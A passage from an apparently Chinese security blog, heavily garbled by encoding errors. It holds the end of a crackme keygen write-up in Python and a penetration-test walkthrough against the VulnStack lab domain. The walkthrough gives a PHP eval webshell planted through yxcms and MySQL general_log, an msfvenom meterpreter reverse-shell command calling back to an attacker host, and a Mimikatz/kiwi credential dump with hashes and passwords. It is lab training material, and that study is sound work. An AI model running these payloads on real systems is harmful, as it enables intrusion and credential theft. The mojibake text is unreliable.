ds:[ecx+ebp]   ; dl = ebp + ecx = ä»ç”¨æˆ·åçš„ç¬¬å››ä¸ªå­—ç¬¦å¼€å§‹è®¡ç®—<span class="hljs-number">00401367</span>  |.  <span class="hljs-number">8</span>A98 <span class="hljs-number">30504000</span> |mov bl,<span class="hljs-type">byte</span> ptr ds:[eax+<span class="hljs-number">0</span>x405030]  ;bl = æ•°æ®è¡¨ç¬¬eaxä¸ªå­—ç¬¦ï¼Œæ•°æ®è¡¨çš„å†…å­˜åœ°å€ä¸º<span class="hljs-number">0</span>x00405030å¤„ï¼ŒæŸ¥æ‰¾å…¶æ•°å€¼ä¸º<span class="hljs-number">0</span>C <span class="hljs-number">0</span>A <span class="hljs-number">13</span> <span class="hljs-number">09</span> <span class="hljs-number">0</span>C <span class="hljs-number">0</span>B <span class="hljs-number">0</span>A <span class="hljs-number">08</span>(æ ¹æ®åˆ¤æ–­è¯­å¥<span class="hljs-number">0</span>x00401359å¯çŸ¥ï¼Œåªæœ‰<span class="hljs-number">8</span>ä¸ªæ•°æ®)<span class="hljs-number">0040136</span>D  |.  <span class="hljs-number">0</span>FAFD3        |imul edx,ebx   ;edx = edx * ebx<span class="hljs-number">00401370</span>  |.  <span class="hljs-number">03</span>F2          |add esi,edx    ;esi = esi + edx<span class="hljs-number">00401372</span>  |.  <span class="hljs-number">41</span>            |inc ecx    ;ecx++<span class="hljs-number">00401373</span>  |.  <span class="hljs-number">40</span>            |inc eax    ;eax++;<span class="hljs-number">00401374</span>  |.  <span class="hljs-number">3</span>BCF          |cmp ecx,edi    ;<span class="hljs-keyword">if</span>(ecx&lt;edi)   å¦‚æœæœªå–å®Œç”¨æˆ·åå­—ç¬¦åˆ™ç»§ç»­00401376  |.^ 7C E1         \jl short   ;&#123;goto 0x00401359&#125; TraceMe.00401359<span class="hljs-number">00401378</span>  |.  <span class="hljs-number">5</span>B            pop ebx   ;è®¡ç®—ç»“æŸ                               ;  <span class="hljs-number">0012</span>FAE8<span class="hljs-number">00401379</span>  |&gt;  <span class="hljs-number">56</span>            push esi                                 ; /&lt;%ld&gt; = <span class="hljs-number">40504</span>F (<span class="hljs-number">4214863</span>.)</code></pre><p>ä½¿ç”¨pythonå†™å‡ºæ³¨å†Œæœº</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">crake_traceme</span>():</span>code, <span class="hljs-built_in">len</span> = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>username = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¾“å…¥ç”¨æˆ·å&quot;</span>)num = [<span class="hljs-number">0x0C</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x08</span>]<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>, <span class="hljs-built_in">len</span>(username)):    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span> &gt; <span class="hljs-number">7</span>:        <span class="hljs-built_in">len</span> = <span class="hljs-number">0</span>    code += <span class="hljs-built_in">ord</span>(username[i]) * num[<span class="hljs-built_in">len</span>]    <span class="hljs-built_in">len</span> += <span class="hljs-number">1</span>print(<span class="hljs-string">&quot;The code is:\n&quot;</span> + <span class="hljs-built_in">str</span>(code))crake_traceme()</code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210418222548281.png" alt="image-20210418222548281">)<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210514155437404.png" alt="image-20210514155437404"></p><h1 id="ä¸€æ¬¡åŸŸæ¸—é€æµ‹è¯•æ”»å‡»"><a href="#ä¸€æ¬¡åŸŸæ¸—é€æµ‹è¯•æ”»å‡»" class="headerlink" title="ä¸€æ¬¡åŸŸæ¸—é€æµ‹è¯•æ”»å‡»"></a>ä¸€æ¬¡åŸŸæ¸—é€æµ‹è¯•æ”»å‡»</h1><p>ç¬¬ä¸€æ¬¡åšæ¸—é€æµ‹è¯•ï¼Œæœ‰çš„åœ°æ–¹åšçš„ä¸æ˜¯å¾ˆå¥½</p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>ä½¿ç”¨çš„é¶æœºæ˜¯çº¢æ—¥å®‰å…¨æä¾›çš„ï¼Œåœ°å€ï¼š<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p><p>æ­å»ºè¿‡ç¨‹ä¸­æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„</p><p>WebæœåŠ¡ä¸»æœºwin7æœ‰ä¸¤å—ç½‘å¡ï¼Œéœ€è¦åœ¨è®¾ç½®ä¸­å†æ·»åŠ ä¸€å—ç½‘å¡</p><p>ç½‘å¡ä¸€è¿æ¥åˆ°<code>VMnet2</code>ä¸­ï¼Œä½œä¸ºå†…ç½‘ç¯å¢ƒ</p><p>ç½‘å¡äºŒè¿æ¥åˆ°<code>VMnet1</code>ä¸­ï¼Œä½œä¸ºå…¬ç½‘ç¯å¢ƒï¼Œå¹¶æ”»å‡»æœºè¿åˆ°<code>VMnet1</code>ä¸­,ç¡®ä¿å…¶å¯ä»¥è®¿é—®ç½‘ç«™ä¸»é¡µ</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511130030032.png" alt="image-20210511130030032" style="zoom:50%;"><p>å‰©ä¸‹çš„ä¸¤å°åŸŸæ§ä¸»æœºç›´æ¥è¿æ¥åˆ°<code>VMnet2</code>ä¸­å³å¯ï¼Œå¯ä»¥ä¸webæœåŠ¡å™¨é€šä¿¡</p><p>ä¿®æ”¹window10ç‰©ç†æœºçš„VMnet1ç½‘å¡</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511214717086.png" alt="image-20210511214717086" style="zoom:67%;"><p>è¿™æ ·ç‰©ç†æœºå’Œkaliéƒ½å¯ä»¥è®¿é—®åˆ°é¶æœºç½‘ç«™</p><p><strong>å®éªŒæ‹“æ‰‘å›¾:</strong></p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511124808522.png" alt="image-20210511124808522" style="zoom: 50%;"><ul><li>webæœåŠ¡å™¨(win7): å…¬ç½‘IP:192.168.74.128   å†…ç½‘IP: 192.168.52.143 ä¸»æœºå:stu1</li><li>åŸŸæˆå‘˜ä¸»æœº(Windows Server 2003)ï¼š192.168.52.141 ä¸»æœºåï¼šroot-tvi862ubeh</li><li>åŸŸæ§(Windows Server 2008)ï¼š192.168.52.138 ä¸»æœºåï¼šowa</li></ul><p>webæœåŠ¡å™¨æœ‰ä¸¤å—ç½‘å¡ï¼Œå…¶ä¸­192.168.74.128æ¨¡æ‹Ÿçš„æ˜¯å…¬ç½‘ç¯å¢ƒï¼Œæ”»å‡»è€…å¯ä»¥ç›´æ¥è®¿é—®ï¼Œ192.168.52.143å±äºå†…ç½‘ï¼Œæ”»å‡»è€…æ— æ³•ç›´æ¥è®¿é—®</p><h2 id="æ¸—é€è¿‡ç¨‹"><a href="#æ¸—é€è¿‡ç¨‹" class="headerlink" title="æ¸—é€è¿‡ç¨‹"></a>æ¸—é€è¿‡ç¨‹</h2><h3 id="ç½‘ç«™æ¢æµ‹"><a href="#ç½‘ç«™æ¢æµ‹" class="headerlink" title="ç½‘ç«™æ¢æµ‹"></a>ç½‘ç«™æ¢æµ‹</h3><p>é¦–å…ˆè®¿é—®ç½‘ç«™ä¸»é¡µ: <a href="http://192.168.74.129/yxcms">http://192.168.74.129/yxcms</a></p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511130446365.png" alt="image-20210511130446365" style="zoom: 50%;"><p>å…ˆæ‰«æä¸€ä¸‹ç›®å½•</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511153857974.png" alt="image-20210511153857974" style="zoom:50%;"><p>å¯ä»¥çœ‹å­˜åœ¨å¾ˆå¤šå¯ä»¥è®¿é—®çš„ç›®å½•ï¼Œå¹¶ä¸”è¿™äº›ç›®å½•éƒ½å­˜åœ¨ç›®å½•éå†æ¼æ´ï¼Œå¦‚<code>/public</code>,å¯ä»¥çœ‹åˆ°è¯¥ç›®å½•ä¸‹çš„å¾ˆå¤šå†…å®¹ï¼Œä½†æ˜¯æ²¡æœ‰æƒ³è¦å†…å®¹</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511154129595.png" alt="image-20210511154129595" style="zoom: 33%;"><h3 id="ç½‘ç«™æ¼æ´åˆ©ç”¨getshell"><a href="#ç½‘ç«™æ¼æ´åˆ©ç”¨getshell" class="headerlink" title="ç½‘ç«™æ¼æ´åˆ©ç”¨getshell"></a>ç½‘ç«™æ¼æ´åˆ©ç”¨getshell</h3><ul><li><p>ç»è¿‡æ¢æµ‹ç½‘ç«™çš„åå°ç™»å½•é¡µé¢æ˜¯<code>http://192.168.74.129/yxcms/index.php?r=admin/index/login</code></p><p>ç»è¿‡çˆ†ç ´å¾ˆå®¹æ˜“è¯•å‡ºå¯†ç ä¸º<code>123456</code></p><p>æˆåŠŸç™»å½•åå°</p></li></ul><ul><li><p>å°è¯•æœç´¢ç½‘ç«™å·²å‘ç°çš„æ¼æ´</p><p>è¿™æ˜¯ä¸€ä¸ªç½‘ç«™å¸¸ç”¨çš„CMSï¼Œåœ¨ç½‘ä¸Šæœç´¢ä¸€ä¸‹æ˜¯å¦å­˜åœ¨å¯ä»¥ç›´æ¥åˆ©ç”¨çš„æ¼æ´</p><p><a href="https://www.freebuf.com/column/162886.html">ä»£ç å®¡è®¡| yxcms app 1.4.6 æ¼æ´é›†åˆ</a></p><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªcmsè¿˜æ˜¯å­˜åœ¨å‡ ä¸ªå¾ˆå¥½åˆ©ç”¨çš„æ¼æ´çš„ï¼Œå°è¯•ä½¿ç”¨å…¶ä¸­æ–‡ä»¶å†™å…¥æ¼æ´</p><p>è®¿é—®<code>http://192.168.74.129/yxcms/index.php?r=admin/set/tpadd&amp;Mname=default</code>ï¼Œè¿™é‡Œå¯ä»¥å†™å…¥phpæ–‡ä»¶</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511155855512.png" alt="image-20210511155855512" style="zoom:50%;"></li></ul><p>å†™å…¥ä¸€å¥è¯æœ¨é©¬</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511155949294.png" alt="image-20210511155949294"></p><p>å†™å…¥æˆåŠŸåï¼Œè®¿é—®<code>http://192.168.74.129/yxcms/protected/apps/default/view/default/info.php</code>å¯ä»¥çœ‹åˆ°å·²ç»æˆåŠŸå†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œä¹‹åå°±æ˜¯ç”¨èšå‰‘è¿æ¥</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511160216194.png" alt="image-20210511160216194" style="zoom: 33%;"><p>æˆåŠŸè·å–shellï¼Œå¹¶ä¸”æ˜¯systemæƒé™ï¼Œè¿™æ˜¯ç”±äºè¯¥ç½‘ç«™ç®¡ç†å‘˜ç›´æ¥ä½¿ç”¨<code>administrator</code>ç™»å½•åŸŸæ§ä¸»æœºï¼Œè‹¥æ˜¯åœ¨çœŸæ˜¯ç¯å¢ƒä¸­è·å–çš„æ˜¯æ™®é€šç”¨æˆ·æƒé™åˆ™è¿˜éœ€è¦é…åˆææƒï¼Œè·å–systemæƒé™</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511160418538.png" alt="image-20210511160418538" style="zoom:50%;"><h3 id="ä½¿ç”¨phpMyAdmin-Getshell"><a href="#ä½¿ç”¨phpMyAdmin-Getshell" class="headerlink" title="ä½¿ç”¨phpMyAdmin Getshell"></a>ä½¿ç”¨phpMyAdmin Getshell</h3><p>æ‰«æ<code>http://192.168.74.129/</code></p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511160728113.png" alt="image-20210511160728113" style="zoom:50%;"><p>ç›´æ¥ä½¿ç”¨å·¥å…·çˆ†ç ´ï¼Œå¾ˆå®¹æ˜“å¾—åˆ°ï¼Œç”¨æˆ·åå’Œå¯†ç éƒ½ä¸º<code>root</code></p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511132208919.png" alt="image-20210511132208919" style="zoom:50%;"><p>ä¸€å¼€å§‹çš„æƒ³æ³•æ˜¯åˆ©ç”¨å†™<code>into outfile</code>å†™æœ¨é©¬getshellï¼Œä½†æ˜¯ç”±äºç½‘ç«™çš„<code>secure_file_priv</code>çš„å€¼ä¸ºNULLï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½åˆ©ç”¨å†™<code>into outfile</code>å†™æœ¨é©¬getshell</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511161606685.png" alt="image-20210511161606685" style="zoom:50%;"><p>ä½†æ˜¯è¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼Œå°±æ˜¯å‘mysqlæ—¥å¿—ä¸­å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œå…·ä½“å¦‚ä¸‹:<a href="https://blog.csdn.net/qq_36119192/article/details/103461736#%E5%88%A9%E7%94%A8%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6Getshell">mysqlæ—¥å¿—æœ¨é©¬</a></p><p>æ‰§è¡Œä¸‹åˆ—å‘½ä»¤</p><pre><code class="hljs mysql">set global general_log&#x3D;on;                                     #å¼€å¯æ—¥å¿—set global general_log_file&#x3D;&#39;C:&#x2F;phpstudy&#x2F;www&#x2F;yxcms&#x2F;hack.php&#39;;  #è®¾ç½®æŒ‡å®šæ–‡ä»¶ä¸ºç½‘ç«™æ—¥å¿—å­˜æ”¾æ–‡ä»¶SELECT &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;                  #æ‰§è¡Œè¯¥è¯­å¥ï¼Œä¼šå°†è¯¥å‘½ä»¤å†™å…¥æ—¥å¿—æ–‡ä»¶</code></pre><p>æ‰§è¡Œå®Œå‘½ä»¤ï¼Œä¾¿å¯ä»¥åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹çœ‹åˆ°<code>hack.php</code></p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511162058801.png" alt="image-20210511162058801"></p><p>æµè§ˆå™¨è®¿é—®<code>http://192.168.74.129/yxcms/hack.php</code>ï¼Œä¸€å¥è¯æœ¨é©¬è®¿é—®æˆåŠŸ</p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210511162146968.png" alt="image-20210511162146968" style="zoom:50%;"><h2 id="åæ¸—é€æ”»å‡»"><a href="#åæ¸—é€æ”»å‡»" class="headerlink" title="åæ¸—é€æ”»å‡»"></a>åæ¸—é€æ”»å‡»</h2><p>åœ¨æ‹¿åˆ°äº†WebæœåŠ¡å™¨çš„æƒé™åï¼Œæˆ‘ä»¬å°±è¦å°½å¯èƒ½å¤šçš„æœé›†è¯¥æœåŠ¡å™¨çš„ä¿¡æ¯ï¼Œç„¶åæ­å»ºéš§é“é€šå¾€å†…ç½‘ã€‚</p><p>æ‰§è¡Œ<code>whoami</code> ,<code>ipconfig</code>,<code>net localgroup administrators</code>å‘½ä»¤æˆ‘ä»¬çŸ¥é“å½“å‰çš„ç”¨æˆ·èº«ä»½æ˜¯ <code>administrator</code> ï¼Œåœ¨ç®¡ç†å‘˜ç»„ä¸­ï¼Œå¹¶ä¸”å¤„åœ¨åŸŸ god ä¸­ã€‚è¯¥ä¸»æœºæœ‰ä¸¤å¼ ç½‘å¡ï¼Œåˆ†åˆ«æ˜¯ï¼š192.168.74.129ï¼Œ192.168.52.143</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511162608469.png" alt="image-20210511162608469" style="zoom: 50%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511162902010.png" alt="image-20210511162902010" style="zoom: 80%;"></p><h3 id="è·å–MSF-shell"><a href="#è·å–MSF-shell" class="headerlink" title="è·å–MSF shell"></a>è·å–MSF shell</h3><p>ä½¿ç”¨<code>msf</code>ç”Ÿæˆæœ¨é©¬</p><ul><li><p>kaliç»ˆç«¯è¾“å…¥<code>msfconsole</code>ï¼Œè¿›å…¥msf</p></li><li><p>é€‰æ‹©å¸¦reverseå’Œmeterpreter(å‘é€ç«¯æ¥å—ç«¯è¿æ¥)çš„payloadsè¿›è¡Œåå¼¹ç«¯å£</p><pre><code class="hljs awk">use windows<span class="hljs-regexp">/x64/m</span>eterpreter_reverse_tcp</code></pre><p>è¾“å…¥<code>show options</code>æŸ¥çœ‹æ–¹æ³•</p></li><li><p>æ–°å¼€ä¸€ä¸ªç»ˆç«¯è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œç”Ÿæˆæœ¨é©¬æ–‡ä»¶ï¼Œå¹¶åˆ©ç”¨èšå‰‘ä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºä¸­</p></li></ul><pre><code class="hljs apache"><span class="hljs-attribute">msfvenom</span> -p windows/x<span class="hljs-number">64</span>/meterpreter_reverse_tcp lhost=<span class="hljs-number">192.168.74.130</span> lport=<span class="hljs-number">4444</span> -f exe -o <span class="hljs-number">1</span>.exe</code></pre><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511163917527.png" alt="image-20210511163917527" style="zoom: 67%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511164107563.png" alt="image-20210511164107563" style="zoom: 50%;"><ul><li><p>å†æ¬¡è¾“å…¥msfconsole è¿›å…¥åº”ç”¨ï¼Œè¾“å…¥<code>use exploit/multi/handler</code>è¿›å…¥ç®¡ç†å·¥å…·ï¼Œè·å–shellæƒé™ï¼Œå‘½ä»¤å¦‚ä¸‹</p><pre><code class="hljs routeros">use exploit/multi/handler<span class="hljs-builtin-name">set</span> payload windows/x64/meterpreter_reverse_tcp<span class="hljs-builtin-name">set</span> lhost kali<span class="hljs-string">&#x27;s ip</span><span class="hljs-string">run</span></code></pre><p>å³å¯è·å–shell</p></li></ul><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511165317518.png" alt="image-20210511165317518" style="zoom:67%;"><h3 id="è·å–å¯†ç "><a href="#è·å–å¯†ç " class="headerlink" title="è·å–å¯†ç "></a>è·å–å¯†ç </h3><p>åœ¨<code>meterpreter</code>ä¸­è¿è¡Œ<code>run windows/gather/smart_hashdump</code>,ä½†æ˜¯å‡ºç°é”™è¯¯ï¼Œæç¤ºéœ€è¦systemè¿›ç¨‹æƒé™</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511182726579.png" alt="image-20210511182726579" style="zoom:67%;"><p>ä½¿ç”¨<code>migrate 388</code>å°†meterpreterè¿ç§»åˆ°64ä½çš„è¿›ç¨‹ï¼Œè€Œä¸”è¯¥è¿›ç¨‹ä¹Ÿéœ€è¦æ˜¯systemæƒé™è¿è¡Œçš„</p><p>å†ä½¿ç”¨<code>run windows/gather/smart_hashdump</code></p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511183026072.png" alt="image-20210511183026072" style="zoom: 50%;"><p>æ¥ä¸‹æ¥æ˜¯ç ´è§£è¯¥å¯†ç </p><p><strong>åŠ è½½ kiwiæ¨¡å—</strong></p><pre><code class="hljs ebnf"><span class="hljs-attribute">load kiwi</span><span class="hljs-attribute">creds_all</span></code></pre><p>ç»“æœå¦‚ä¸‹</p><pre><code class="hljs armasm"><span class="hljs-symbol">meterpreter</span> &gt; creds_all[+] Running as SYSTEM[*] Retrieving all credentials<span class="hljs-symbol">msv</span> credentials===============<span class="hljs-symbol">Username</span>       Domain  LM                                NTLM                              SHA1--------       ------  --                                ----                              ----<span class="hljs-symbol">Administrator</span>  GOD     edea194d76c77d87840ac10a764c7362  <span class="hljs-number">8</span>a963371a63944419ec1adf687bb1be5  <span class="hljs-number">343</span>f44056ed02360aead5618dd42e4614b5f70cf<span class="hljs-symbol">STU1$</span>          GOD                                       cde51539f42c2854d74e82db1173dd8c  <span class="hljs-number">50950</span>d918317edf0ab95661a565c6ebf1151fe3b<span class="hljs-symbol">wdigest</span> credentials===================<span class="hljs-symbol">Username</span>       Domain  Password--------       ------  --------(null)         (null)  (null)<span class="hljs-symbol">Administrator</span>  GOD     hongrisec<span class="hljs-comment">@2019</span><span class="hljs-symbol">STU1$</span>          GOD     <span class="hljs-number">81</span> <span class="hljs-built_in">c2</span> <span class="hljs-number">84</span> <span class="hljs-number">7</span>c a6 <span class="hljs-number">0</span>f <span class="hljs-number">51</span> <span class="hljs-number">4</span>b <span class="hljs-number">41</span> <span class="hljs-number">91</span> b3 <span class="hljs-number">1</span>a <span class="hljs-number">0</span>d <span class="hljs-number">7</span>e <span class="hljs-number">56</span> <span class="hljs-number">32</span> <span class="hljs-number">0</span>e <span class="hljs-number">37</span> <span class="hljs-built_in">c7</span> <span class="hljs-number">77</span> <span class="hljs-built_in">f7</span> <span class="hljs-number">54</span> <span class="hljs-number">09</span> <span class="hljs-built_in">f4</span> <span class="hljs-built_in">f2</span> <span class="hljs-number">8</span>b <span class="hljs-number">54</span> cc <span class="hljs-number">6</span>b <span class="hljs-number">20</span> <span class="hljs-number">7</span>e <span class="hljs-number">9</span>c <span class="hljs-number">56</span> <span class="hljs-number">46</span> e5 ee <span class="hljs-built_in">d9</span> <span class="hljs-built_in">d2</span> <span class="hljs-number">84</span> aa <span class="hljs-number">6</span>a <span class="hljs-number">82</span> <span class="hljs-number">82</span> <span class="hljs-number">58</span> b1 ae bf <span class="hljs-number">47</span> db <span class="hljs-number">9</span>f <span class="hljs-number">53</span> <span class="hljs-number">9</span>e <span class="hljs-built_in">c9</span> <span class="hljs-built_in">a1</span> <span class="hljs-number">5</span>f bb ae <span class="hljs-built_in">a2</span> <span class="hljs-built_in">c3</span> <span class="hljs-number">7</span>f <span class="hljs-number">2</span>d <span class="hljs-number">37</span> <span class="hljs-number">9</span>d <span class="hljs-built_in">c1</span> <span class="hljs-number">9</span>a <span class="hljs-number">25</span> <span class="hljs-number">95</span> <span class="hljs-built_in">f6</span> <span class="hljs-number">49</span> b8 <span class="hljs-built_in">a2</span> <span class="hljs-built_in">f1</span> cb <span class="hljs-number">0</span>a ad <span class="hljs-built_in">f2</span> b2 <span class="hljs-number">27</span> <span class="hljs-built_in">c8</span> <span class="hljs-number">36</span> b2 eb a5 <span class="hljs-built_in">d9</span> <span class="hljs-number">3</span>c <span class="hljs-number">10</span> ca <span class="hljs-number">0</span>c <span class="hljs-number">38</span> <span class="hljs-number">18</span> <span class="hljs-number">63</span> fb <span class="hljs-number">0</span>d <span class="hljs-number">7</span>f <span class="hljs-number">67</span> ec <span class="hljs-number">37</span> <span class="hljs-number">87</span> <span class="hljs-number">84</span> e9 cc <span class="hljs-built_in">f3</span> <span class="hljs-built_in">d8</span> <span class="hljs-number">56</span> <span class="hljs-number">72</span> bc <span class="hljs-number">0</span>c cf e8 <span class="hljs-number">20</span> a7 <span class="hljs-number">93</span> <span class="hljs-number">07</span> <span class="hljs-number">29</span> <span class="hljs-number">3</span>d b5 <span class="hljs-number">48</span> b6 <span class="hljs-number">33</span> de e9 df <span class="hljs-number">3</span>a <span class="hljs-number">73</span> <span class="hljs-number">04</span> <span class="hljs-number">94</span> a7 <span class="hljs-number">90</span> e6 <span class="hljs-built_in">d5</span> <span class="hljs-number">4</span>f ce a8 <span class="hljs-number">88</span> <span class="hljs-number">9</span>e a5 <span class="hljs-number">18</span> <span class="hljs-number">78</span> e4 <span class="hljs-number">43</span> e8 <span class="hljs-number">5</span>b e5 <span class="hljs-number">47</span> dc <span class="hljs-number">0</span>a <span class="hljs-number">34</span> be <span class="hljs-number">79</span> <span class="hljs-number">6</span>a fa fe <span class="hljs-number">7</span>f <span class="hljs-built_in">d5</span> <span class="hljs-built_in">c6</span> <span class="hljs-number">38</span> <span class="hljs-number">48</span> <span class="hljs-number">79</span> <span class="hljs-number">53</span> <span class="hljs-number">7</span>b <span class="hljs-number">3</span>f <span class="hljs-number">8</span>f <span class="hljs-number">9</span>e <span class="hljs-number">78</span> <span class="hljs-number">31</span> cf <span class="hljs-number">35</span> <span class="hljs-number">7</span>b <span class="hljs-number">12</span> <span class="hljs-number">93</span> e7 <span class="hljs-number">3</span>a <span class="hljs-built_in">f1</span> <span class="hljs-number">0</span>c de <span class="hljs-number">90</span> <span class="hljs-built_in">d9</span> e5 <span class="hljs-number">69</span> <span class="hljs-number">02</span> a9 ab <span class="hljs-built_in">c6</span> da <span class="hljs-built_in">f2</span> <span class="hljs-number">09</span> <span class="hljs-number">2</span>f <span class="hljs-number">8</span>a <span class="hljs-number">0</span>a ed <span class="hljs-number">19</span> <span class="hljs-number">44</span> <span class="hljs-number">11</span> <span class="hljs-built_in">c4</span> ba <span class="hljs-number">93</span> <span class="hljs-number">12</span> <span class="hljs-number">73</span> <span class="hljs-number">04</span> <span class="hljs-number">69</span> <span class="hljs-number">3</span>a <span class="hljs-number">31</span> <span class="hljs-number">4</span>e ff b8 a7 <span class="hljs-number">72</span> da <span class="hljs-number">4</span>b <span class="hljs-number">6</span>e ad db e9 <span class="hljs-number">52</span> <span class="hljs-number">7</span>f <span class="hljs-number">88</span> cf <span class="hljs-number">0</span>f <span class="hljs-number">01</span> <span class="hljs-number">92</span> <span class="hljs-number">87</span> <span class="hljs-number">68</span> ba <span class="hljs-number">5</span>a <span class="hljs-built_in">d1</span> <span class="hljs-built_in">d3</span> ec <span class="hljs-number">1</span>f <span class="hljs-built_in">c3</span> b1 a5 <span class="hljs-number">3</span>b <span class="hljs-number">44</span> e5 <span class="hljs-number">7</span>b <span class="hljs-number">9</span>d <span class="hljs-number">2</span>f a9 <span class="hljs-number">28</span> <span class="hljs-number">5</span>b<span class="hljs-symbol">tspkg</span> credentials=================<span class="hljs-symbol">Username</span>       Domain  Password--------       ------  --------<span class="hljs-symbol">Administrator</span>  GOD     hongrisec<span class="hljs-comment">@2019</span><span class="hljs-symbol">kerberos</span> credentials====================<span class="hljs-symbol">Username</span>       Domain   Password--------       ------   --------(null)         (null)   (null)<span class="hljs-symbol">Administrator</span>  GOD.ORG  hongrisec<span class="hljs-comment">@2019</span><span class="hljs-symbol">stu1$</span>          GOD.ORG  <span class="hljs-number">81</span> <span class="hljs-built_in">c2</span> <span class="hljs-number">84</span> <span class="hljs-number">7</span>c a6 <span class="hljs-number">0</span>f <span class="hljs-number">51</span> <span class="hljs-number">4</span>b <span class="hljs-number">41</span> <span class="hljs-number">91</span> b3 <span class="hljs-number">1</span>a <span class="hljs-number">0</span>d <span class="hljs-number">7</span>e <span class="hljs-number">56</span> <span class="hljs-number">32</span> <span class="hljs-number">0</span>e <span class="hljs-number">37</span> <span class="hljs-built_in">c7</span> <span class="hljs-number">77</span> <span class="hljs-built_in">f7</span> <span class="hljs-number">54</span> <span class="hljs-number">09</span> <span class="hljs-built_in">f4</span> <span class="hljs-built_in">f2</span> <span class="hljs-number">8</span>b <span class="hljs-number">54</span> cc <span class="hljs-number">6</span>b <span class="hljs-number">20</span> <span class="hljs-number">7</span>e <span class="hljs-number">9</span>c <span class="hljs-number">56</span> <span class="hljs-number">46</span> e5 ee <span class="hljs-built_in">d9</span> <span class="hljs-built_in">d2</span> <span class="hljs-number">84</span> aa <span class="hljs-number">6</span>a <span class="hljs-number">82</span> <span class="hljs-number">82</span> <span class="hljs-number">58</span> b1 ae bf <span class="hljs-number">47</span> db <span class="hljs-number">9</span>f <span class="hljs-number">53</span> <span class="hljs-number">9</span>e <span class="hljs-built_in">c9</span> <span class="hljs-built_in">a1</span> <span class="hljs-number">5</span>f bb ae <span class="hljs-built_in">a2</span> <span class="hljs-built_in">c3</span> <span class="hljs-number">7</span>f <span class="hljs-number">2</span>d <span class="hljs-number">37</span> <span class="hljs-number">9</span>d <span class="hljs-built_in">c1</span> <span class="hljs-number">9</span>a <span class="hljs-number">25</span> <span class="hljs-number">95</span> <span class="hljs-built_in">f6</span> <span class="hljs-number">49</span> b8 <span class="hljs-built_in">a2</span> <span class="hljs-built_in">f1</span> cb <span class="hljs-number">0</span>a ad <span class="hljs-built_in">f2</span> b2 <span class="hljs-number">27</span> <span class="hljs-built_in">c8</span> <span class="hljs-number">36</span> b2 eb a5 <span class="hljs-built_in">d9</span> <span class="hljs-number">3</span>c <span class="hljs-number">10</span> ca <span class="hljs-number">0</span>c <span class="hljs-number">38</span> <span class="hljs-number">18</span> <span class="hljs-number">63</span> fb <span class="hljs-number">0</span>d <span class="hljs-number">7</span>f <span class="hljs-number">67</span> ec <span class="hljs-number">37</span> <span class="hljs-number">87</span> <span class="hljs-number">84</span> e9 cc <span class="hljs-built_in">f3</span> <span class="hljs-built_in">d8</span> <span class="hljs-number">56</span> <span class="hljs-number">72</span> bc <span class="hljs-number">0</span>c cf e8 <span class="hljs-number">20</span> a7 <span class="hljs-number">93</span> <span class="hljs-number">07</span> <span class="hljs-number">29</span> <span class="hljs-number">3</span>d b5 <span class="hljs-number">48</span> b6 <span class="hljs-number">33</span> de e9 df <span class="hljs-number">3</span>a <span class="hljs-number">73</span> <span class="hljs-number">04</span> 